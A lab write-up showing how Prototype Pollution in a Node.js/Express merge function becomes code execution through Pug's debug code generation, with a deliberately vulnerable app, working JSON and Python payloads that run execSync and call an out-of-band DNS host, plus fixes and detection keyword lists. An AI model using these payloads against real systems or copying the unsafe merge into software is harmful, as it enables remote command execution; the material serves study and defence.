---
title: "AST Injection through Pug"
date: 2026-05-17
category: "web-security"
difficulty: "advanced"
source: "7heKnight Research"
tags: [nodejs, pug, prototype-pollution, ast-injection, rce, web-security]
excerpt: "A detailed lab note on turning Prototype Pollution into code execution through Pug's AST/code-generation path: vulnerable merge, prototype chain behavior, debugger observations, exploit shape, trigger conditions and defenses."
cover: "/writeups/ast-injection-through-pug/AST_FinalResult.png"
draft: false
---

> Authorization note: this writeup uses a deliberately vulnerable local lab.
> Only reproduce these techniques in environments you own or are explicitly
> authorized to test. The point is to understand the bug class and how to
> defend against it, not to test random Node.js applications on the internet.

## TL;DR

The bug chain is:

```text
unsafe recursive merge
  -> Object.prototype pollution
  -> inherited AST-looking properties become visible to Pug
  -> Pug debug code generation emits node.line into generated JavaScript
  -> attacker-controlled JavaScript executes during template compilation
```

The exploit is not "Pug is always RCE". The exploit needs the right set of
conditions:

1. The application accepts attacker-controlled object keys.
2. The application recursively merges those keys into a normal JavaScript
   object.
3. The merge allows prototype-changing keys such as `__proto__`,
   `constructor` or `prototype`.
4. The polluted process later compiles a Pug template.
5. The Pug compile path uses debug behavior where `node.line` is embedded into
   generated JavaScript.

When those pieces line up, a JSON request can poison the Node.js process, and a
later template compilation can become code execution.

## Why This Was Interesting

This research started from an interview-style lab that chained several web
security topics: race conditions, Text4Shell and Prototype Pollution. The
Prototype Pollution part was the one that stayed in my head because the impact
was not just "some object has a weird property now". The pollution crossed a
trust boundary and influenced a compiler.

That distinction matters. A lot of Prototype Pollution examples stop at:

```javascript
({}).polluted === true
```

That proves the primitive, but it does not explain the impact. The real
question is: what sensitive code will read the polluted property later?

In this lab, the sensitive reader is Pug's compiler. Pug parses template text
into an Abstract Syntax Tree (AST), walks that tree, and emits JavaScript. If
attacker-controlled inherited properties are treated as AST fields, the
attacker has a path from "object property pollution" to "code generation".

## Mental Model

Keep three layers separate:

| Layer | What goes wrong | Why it matters |
|---|---|---|
| Application layer | Unsafe merge writes attacker keys into an object | This creates the pollution primitive |
| JavaScript runtime layer | `Object.prototype` gains attacker-controlled properties | New ordinary objects can inherit those properties |
| Compiler layer | Pug walks objects and generates JavaScript from AST fields | Polluted fields can reach a code-generation sink |

The exploit does not need to control the Pug template itself. It only needs the
same Node.js process to compile any Pug template after the prototype has been
polluted.

That is the uncomfortable part: the request that creates the bug and the
request that triggers the impact can be different.

## Lab Setup

The lab is intentionally small. It exposes one route that performs an unsafe
merge and one route that compiles a Pug template.

`package.json`:

```json
{
  "dependencies": {
    "body-parser": "^1.20.2",
    "express": "^4.18.2",
    "pug": "^3.0.2"
  }
}
```

`index.js`:

```javascript
const express = require('express');
const pug = require('pug');
const path = require('path');

const app = express();
app.use(require('body-parser').json());

function isObject(obj) {
  return typeof obj === 'function' || typeof obj === 'object';
}

function merge(target, source) {
  for (const key in source) {
    if (isObject(target[key]) && isObject(source[key])) {
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }

  return target;
}

app.get('/', function (req, res) {
  if (req.query.source !== undefined) {
    res.sendFile(path.join(__dirname, 'index.js'));
    return;
  }

  const template = pug.compile('7heknight', { debug: true });
  res.end(
    '<h1>hard code better than template change my mind</h1>' +
      template() +
      '<br><a href="?source">Debug</a>'
  );
});

app.post('/vulnerable', function (req, res) {
  const object = {};

  try {
    merge(object, req.body);
    res.json(object);
  } catch (error) {
    process.exit();
  }
});

console.log('listen on port 4000');
app.listen(4000);
```

Run the lab:

```bash
npm install
node index.js
```

There are two important application behaviors:

1. `POST /vulnerable` parses attacker-controlled JSON and passes it to
   `merge(object, req.body)`.
2. `GET /` calls `pug.compile('7heknight', { debug: true })`.

Those two routes do not look connected. That is exactly why Prototype Pollution
is easy to underestimate: it creates process-wide side effects through shared
prototypes.

## The Vulnerable Merge

The vulnerable part is this function:

```javascript
function merge(target, source) {
  for (const key in source) {
    if (isObject(target[key]) && isObject(source[key])) {
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }

  return target;
}
```

At first glance, it looks like normal recursive merge logic. The problem is
that it trusts every key from `source`.

Three details make it dangerous.

### 1. It iterates attacker-controlled keys

`for (const key in source)` walks enumerable keys. If the request body contains
`"name"`, `"theme"`, `"debug"`, or `"__proto__"`, the function handles all of
them as normal keys.

There is no denylist:

```javascript
if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
  throw new Error('dangerous key');
}
```

There is also no schema validation that says which keys are expected.

### 2. It reads `target[key]` before deciding what to do

This line is subtle:

```javascript
if (isObject(target[key]) && isObject(source[key])) {
```

When `key` is `"__proto__"` and `target` is a normal object, `target[key]`
does not behave like an ordinary data field. It reaches the special prototype
accessor on `Object.prototype`. In practice, `target["__proto__"]` points to
the object's prototype.

For a fresh object:

```javascript
const object = {};
object.__proto__ === Object.prototype; // true
```

So the merge does not simply assign a harmless `"__proto__"` property. It can
descend into the prototype object itself.

### 3. It treats functions as mergeable objects

The helper is also loose:

```javascript
function isObject(obj) {
  return typeof obj === 'function' || typeof obj === 'object';
}
```

It returns true for objects, functions and also `null` because
`typeof null === 'object'`. This lab does not rely on the `null` case, but it
shows the function is not a careful type guard. A safer helper would at least
reject `null` and arrays, then still block prototype keys separately.

## Proving Prototype Pollution

A minimal pollution request looks like this:

```json
{
  "__proto__": {
    "polluted": "yes"
  }
}
```

Send it to the vulnerable route:

```bash
curl -s http://127.0.0.1:4000/vulnerable \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"polluted":"yes"}}'
```

Inside the process, the effect is equivalent to:

```javascript
Object.prototype.polluted = 'yes';
```

A quick local check:

```javascript
const object = {};
merge(object, JSON.parse('{"__proto__":{"polluted":"yes"}}'));

console.log({}.polluted); // yes
```

This is already a vulnerability, but not yet the final impact. Now we need a
sensitive consumer of inherited properties.

## What Is an AST?

An Abstract Syntax Tree is a structured representation of source code. Instead
of treating code as one long string, a parser turns it into nodes.

A tiny Pug template:

```pug
h1= msg
```

is represented internally as a tree with nodes that describe the tag, the code
expression, child blocks, line numbers and other metadata.

![AST overview](/writeups/ast-injection-through-pug/AST0.jpg)

A simplified AST shape might look like:

```json
{
  "type": "Block",
  "nodes": [
    {
      "type": "Tag",
      "name": "h1",
      "block": {
        "type": "Block",
        "nodes": [
          {
            "type": "Code",
            "val": "msg",
            "buffer": true,
            "line": 1
          }
        ]
      }
    }
  ]
}
```

The compiler then walks this tree and emits JavaScript that renders HTML.

The safety expectation is simple: trusted parser code creates trusted AST
nodes. User-controlled inherited properties should not be accepted as if they
were parser-created fields.

## Walking Pug's Compile Path

The public research started with `compileFile()`, so I followed the same path:

```javascript
const pug = require('pug');

const compiledFunction = pug.compileFile('template.pug');
console.log(compiledFunction());
```

The exported `pug` object exposes several compile helpers, including
`compile`, `compileFile` and `compileClient`.

![Pug library exports](/writeups/ast-injection-through-pug/pug_library.png)

`compileFile()` mostly handles file loading, filename normalization and cache
behavior. After that, execution returns to the common compile path.

![Pug compileFile](/writeups/ast-injection-through-pug/pug0.png)

Inside `handleTemplateCache()`, execution reaches `compile()`.

![Pug template cache path](/writeups/ast-injection-through-pug/pug1.png)

`compile()` then calls `compileBody()`, where Pug parses the template and sends
the AST to code generation.

![Pug compile body](/writeups/ast-injection-through-pug/pug2.png)

The high-level path is:

```text
pug.compile()
  -> compileBody()
  -> lex/parse template text into an AST
  -> generateCode(ast, options)
  -> new Compiler(ast, options)
  -> compiler.compile()
  -> compiler.visit(node)
```

Following `generateCode()` leads into `node_modules/pug-code-gen/index.js`.

![Pug code generator exports](/writeups/ast-injection-through-pug/pug_generator0.png)

The compiler's core job is to visit nodes by type. Conceptually:

```javascript
visit(node) {
  const debug = this.debug;

  if (debug && node.debug !== false && node.line) {
    this.buf.push('pug_debug_line = ' + node.line + ';');
  }

  this['visit' + node.type](node);
}
```

That is not a full copy of the implementation, but it captures the important
behavior: when debug mode is active, Pug emits code that assigns the current
template line number to `pug_debug_line`.

![Pug visit function](/writeups/ast-injection-through-pug/pug_generator1.png)

With normal parser-created AST nodes, `node.line` is a number:

```javascript
pug_debug_line = 1;
```

With polluted attacker-controlled data, `node.line` can be a JavaScript
expression:

```javascript
pug_debug_line = console.log(process.version);
```

That is the sink.

![Pug debug line generation](/writeups/ast-injection-through-pug/pug_generator2.png)

## Why `debug: true` Matters

Pug's debug mode exists to make template errors easier to understand. It tracks
where execution is inside the original template so stack traces can point back
to template lines.

For a normal node, debug code is useful and harmless:

```javascript
pug_debug_line = 1;
```

The dangerous behavior is not the variable itself. The dangerous behavior is
that a value derived from an AST field is concatenated into generated
JavaScript.

If `node.line` is assumed to be numeric but is actually attacker-controlled
source text, the generated function changes meaning.

Safe mental model:

```text
line number data -> generated JavaScript data assignment
```

Exploit mental model:

```text
attacker JavaScript string -> generated JavaScript code
```

That is why this chain is compiler-side injection rather than just object
mutation.

## First Proof of Concept

Before using HTTP, it is easier to prove the behavior directly in a standalone
Node.js script:

```javascript
const pug = require('pug');

Object.prototype.block = {
  type: 'Text',
  line: "console.log(process.mainModule.require('child_process').execSync('id').toString())"
};

pug.compile('h1= msg', { debug: true });
```

The important part is `Object.prototype.block`. We are not editing Pug's real
AST object directly. We are adding a property that ordinary objects can inherit
when code later asks for `.block`.

The generated code now contains the injected expression in a debug assignment:

```javascript
pug_debug_line = console.log(
  process.mainModule.require('child_process').execSync('id').toString()
);
```

That confirms the chain:

1. An inherited property can be visible during AST traversal.
2. The inherited property can contain AST-looking data.
3. A field from that data can land in generated JavaScript.

![Compiled output comparison](/writeups/ast-injection-through-pug/pug_compares0.png)

This first proof of concept is useful, but it still feels a little magical.
The next step is understanding which object shape Pug expects while walking the
tree.

## Debugging the Better Payload Shape

While stepping through Pug, I found `visitCode()`, the function responsible for
processing `Code` nodes.

![Pug visitCode function](/writeups/ast-injection-through-pug/AST_VisitCode0.png)

At runtime, the `Code` node looked like this:

![Runtime Code node](/writeups/ast-injection-through-pug/AST_VisitCode1.png)

Represented as JSON-style data:

```json
{
  "type": "Code",
  "val": "123",
  "buffer": true,
  "mustEscape": true,
  "isInline": true,
  "line": 1,
  "column": 3,
  "block": {
    "type": "Text",
    "line": "console.log(process.mainModule.require('child_process').execSync('whoami').toString())"
  }
}
```

The key observation is that a `Code` node can have a `block`. If Pug visits a
code node and then follows a `block` property, a polluted inherited `block`
can become part of the traversal.

The payload does not need to recreate the entire AST. It only needs to provide
the properties Pug will look up at the right moment.

## The Optimized Local Exploit

Based on the debugger output, the local exploit becomes:

```javascript
const pug = require('pug');

Object.prototype.block = {
  type: 'Text',
  line: "console.log(process.mainModule.require('child_process').execSync('whoami').toString())"
};

Object.prototype.code = {};
pug.compile('h1', { debug: true });
```

The two polluted keys serve different purposes:

| Key | Purpose |
|---|---|
| `code` | Helps shape the traversal so Pug processes a code-related path |
| `block` | Provides an inherited AST-like node with a malicious `line` field |

The `block` object says:

```json
{
  "type": "Text",
  "line": "<JavaScript expression>"
}
```

The `type` value matters because the compiler dispatches visitors by node type.
The `line` value matters because debug code generation emits it into the
compiled function.

![Local AST result](/writeups/ast-injection-through-pug/AST_Result.png)

The result is command execution during Pug's compile phase.

![Final local AST result](/writeups/ast-injection-through-pug/AST_FinalResult.png)

## Moving From Local Script to HTTP

The lab server gives us the same primitive through JSON:

```javascript
app.post('/vulnerable', function (req, res) {
  const object = {};

  try {
    merge(object, req.body);
    res.json(object);
  } catch (error) {
    process.exit();
  }
});
```

So the exploit has two HTTP phases:

1. Send a polluted JSON body to `/vulnerable`.
2. Trigger `/` so the server compiles the Pug template in the polluted process.

The routes are separate because pollution persists in memory. As long as the
same Node.js process handles both requests, the second request can observe the
side effect created by the first request.

### Phase 1: Pollute the prototype

The JSON body:

```json
{
  "__proto__": {
    "code": {},
    "block": {
      "type": "Text",
      "line": "process.mainModule.require('child_process').execSync('nslookup ast-injection.example.oastify.com')"
    }
  }
}
```

Send it:

```bash
curl -s http://127.0.0.1:4000/vulnerable \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"code":{},"block":{"type":"Text","line":"process.mainModule.require('\''child_process'\'').execSync('\''nslookup ast-injection.example.oastify.com'\'')"}}}'
```

After this request, the process has polluted inherited properties:

```javascript
({}).code;
({}).block;
```

### Phase 2: Trigger Pug compilation

The trigger is just a request to `/`:

```bash
curl -i http://127.0.0.1:4000/
```

That route executes:

```javascript
const template = pug.compile('7heknight', { debug: true });
```

The compilation happens after the pollution, so Pug's compiler can see the
inherited AST-like data.

## Python Exploit Script

A controlled outbound DNS lookup is enough to prove command execution without
requiring an interactive shell.

```python
import requests

TARGET_URL = 'http://127.0.0.1:4000'

proxy = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}

payload = {
    '__proto__': {
        'code': {},
        'block': {
            'type': 'Text',
            'line': "process.mainModule.require('child_process').execSync('nslookup ast-injection.example.oastify.com')",
        },
    }
}

print(f'[+] Polluting prototype through {TARGET_URL}/vulnerable')
pollute = requests.post(TARGET_URL + '/vulnerable', proxies=proxy, json=payload)
print(f'[+] POST status: {pollute.status_code}')
print(f'[+] Response: {pollute.text[:200]}')

print(f'[+] Triggering Pug compilation through {TARGET_URL}/')
trigger = requests.get(TARGET_URL + '/', proxies=proxy)
print(f'[+] GET status: {trigger.status_code}')
print(f'[+] Response length: {len(trigger.text)}')
```

The same object can also be represented with `block` nested under `code`:

```json
{
  "__proto__": {
    "code": {
      "block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync('nslookup ast-injection.example.oastify.com')"
      }
    }
  }
}
```

Depending on the exact Pug path and version, one shape may be easier to reach
than the other. The debugging step above is what tells you which property
lookup the compiler actually performs.

After triggering the template compilation route, the collaborator received the
DNS interaction.

![Collaborator interaction](/writeups/ast-injection-through-pug/4000_interaction.png)

In the original lab, this was also validated with an interactive callback.
That should only be done inside an explicitly authorized environment, because
at this point the impact is already remote command execution in the Node.js
process context.

![Lab callback validation](/writeups/ast-injection-through-pug/reverse_shell.png)

## Why the Response From `/vulnerable` May Look Harmless

The `/vulnerable` route returns `res.json(object)`. That can mislead you during
testing because polluted prototype properties may not appear as own properties
on `object`.

For example:

```javascript
const object = {};
merge(object, payload);
console.log(object); // may look empty
console.log({}.block); // polluted inherited property exists
```

JSON serialization normally includes own enumerable properties, not inherited
ones. So a clean-looking JSON response does not prove the merge was safe.

Better checks during local debugging:

```javascript
console.log(Object.prototype.block);
console.log({}.block);
console.log(Object.hasOwn({}, 'block')); // false
```

The last line is especially important. The property is dangerous because it is
inherited, not because every object suddenly owns its own `block` field.

## Root Cause

The root cause has two sides.

Application-side root cause:

- untrusted JSON is recursively merged;
- special prototype keys are not blocked;
- the merge target is a normal `{}` object;
- there is no schema that limits the shape of accepted input.

Compiler-side impact path:

- Pug compiles templates by walking AST nodes;
- debug mode emits `node.line` into generated JavaScript;
- polluted inherited fields can masquerade as AST fields;
- code generation treats the value as source text, not inert data.

The most important practical lesson: Prototype Pollution is rarely the final
impact by itself. It becomes severe when polluted properties are consumed by
powerful code: template engines, serializers, validators, ORMs, configuration
loaders, access-control checks, logging systems, or anything that generates
code or commands.

## Common Pitfalls While Reproducing

### The payload was sent, but nothing happened

Check whether the same Node.js process handled both requests. If the app runs
behind clustering, workers, hot reload, serverless isolation or a process
manager that restarts between requests, the pollution may not survive to the
trigger request.

### The app returns `{}` from `/vulnerable`

That does not mean pollution failed. Inspect inherited properties in the
process, or use an observable trigger such as DNS.

### The exploit works locally but not remotely

Check these conditions:

- Is the target actually using Pug?
- Does it compile templates after the pollution request?
- Is debug compilation enabled?
- Is the vulnerable merge reachable with JSON?
- Are dangerous keys filtered by middleware?
- Is the Node.js version or Pug version different?
- Is outbound DNS or HTTP blocked?

### `process.mainModule` is undefined

Some Node.js versions or execution modes may not expose `process.mainModule` in
the same way. For a lab, you can use another path to `child_process` if the
runtime allows it. For a real assessment, treat this as an environment detail
and validate only inside the authorized scope.

## Defensive Fixes

The best fix is to remove the pollution primitive. Do not rely on the template
engine to save an already-polluted process.

### 1. Reject dangerous keys

Block prototype-changing keys before merging:

```javascript
const DANGEROUS_KEYS = new Set(['__proto__', 'constructor', 'prototype']);

function assertSafeKey(key) {
  if (DANGEROUS_KEYS.has(key)) {
    throw new Error(`Blocked unsafe key: ${key}`);
  }
}
```

Apply the check recursively, not only at the top level. Attackers can place
dangerous keys deep inside an object.

### 2. Prefer schema validation over arbitrary merge

Instead of accepting any object shape, define the shape:

```javascript
const allowed = {
  username: body.username,
  theme: body.theme,
  notifications: {
    email: body.notifications?.email === true
  }
};
```

This is less flexible, but safer. Most application endpoints do not need to
merge arbitrary nested objects from users.

### 3. Use null-prototype dictionaries where appropriate

If you need a plain key-value map, use:

```javascript
const dict = Object.create(null);
```

Objects created this way do not inherit from `Object.prototype`, so inherited
polluted fields such as `block` or `code` are not visible on them.

This is not a complete application-wide fix, but it reduces exposure for data
structures that are supposed to be dictionaries.

### 4. Use ownership checks while walking structured data

When walking compiler-like or schema-like objects, prefer own-property checks:

```javascript
if (Object.hasOwn(node, 'line')) {
  // use node.line
}
```

Do not treat inherited properties as trusted structure.

### 5. Do not compile templates dynamically in production paths

If possible, precompile templates at build time or application startup. Avoid
request-driven template compilation, especially after handling untrusted input.

### 6. Disable unnecessary debug behavior in production

Debug features are useful locally, but they often increase the amount of
metadata, reflection, code generation or stack-trace detail exposed at runtime.
In this chain, debug behavior is the reason `node.line` becomes a codegen sink.

### 7. Reduce blast radius

Even with application fixes, run the service with least privilege:

- no unnecessary filesystem write access;
- no sensitive cloud metadata access;
- restricted outbound traffic where possible;
- separate secrets from the web process;
- logging for suspicious JSON keys and unexpected child process execution.

## Detection Ideas

For request telemetry, look for JSON bodies containing:

```text
__proto__
constructor
prototype
constructor.prototype
```

For this specific AST Injection path, also watch for suspicious combinations:

```text
type
line
block
code
mustEscape
buffer
```

The presence of `type` or `line` alone is not malicious. The signal becomes
stronger when those keys appear inside prototype-changing paths.

Runtime indicators may include:

- unexpected calls to `child_process.exec`, `execSync`, `spawn` or `fork`;
- outbound DNS/HTTP from a service that normally does not make such requests;
- template compilation errors containing strange line values;
- sudden changes in behavior across unrelated routes in the same process.

## Final Takeaways

Prototype Pollution is a primitive. The exploitability depends on what the
polluted properties influence later.

In this lab, the powerful consumer is Pug's compiler:

```text
polluted prototype property
  -> inherited AST-looking field
  -> debug line code generation
  -> JavaScript execution
```

The important review habit is to ask: after untrusted input is merged, which
parts of the application later trust object shape? If the answer includes a
compiler, template engine, authorization check or command builder, the bug
deserves serious attention.

## References

- [AST Injection - n00b-bot](https://n00b-bot.github.io/ast-injection/)
- [AST Injection - archived p6.is research](https://web.archive.org/web/20210813024244/https://blog.p6.is/AST-Injection/)
